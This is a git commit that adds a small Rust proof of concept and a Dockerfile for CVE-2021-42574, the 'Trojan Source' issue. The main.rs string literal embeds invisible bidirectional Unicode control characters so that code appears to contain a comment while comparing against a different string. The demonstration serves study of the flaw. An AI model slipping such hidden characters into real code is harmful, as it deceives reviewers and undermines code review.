3997c21e77355edff3d604d18cc72e2d50930dd3
shiomiyan <dev.umisk@gmail.com>
2021-11-01 22:04:37 +0900

    initial commit

---
+++ Dockerfile
@@ -0,0 +1,7 @@
+FROM rust:1.56
+
+COPY ./ ./
+
+RUN cargo build --release
+
+CMD [ "./target/release/CVE-2021-42574" ]
---
+++ src/main.rs
@@ -0,0 +1,9 @@
+fn main() {
+    let access_level = "user";
+    // if access_level != "user%u202E %u2066// Check if admin%u2069 %u2066" {
+    if access_level != "user‮ ⁦// Check if admin⁩ ⁦" {
+        println!("admin");
+    } else {
+        println!("user");
+    }
+}
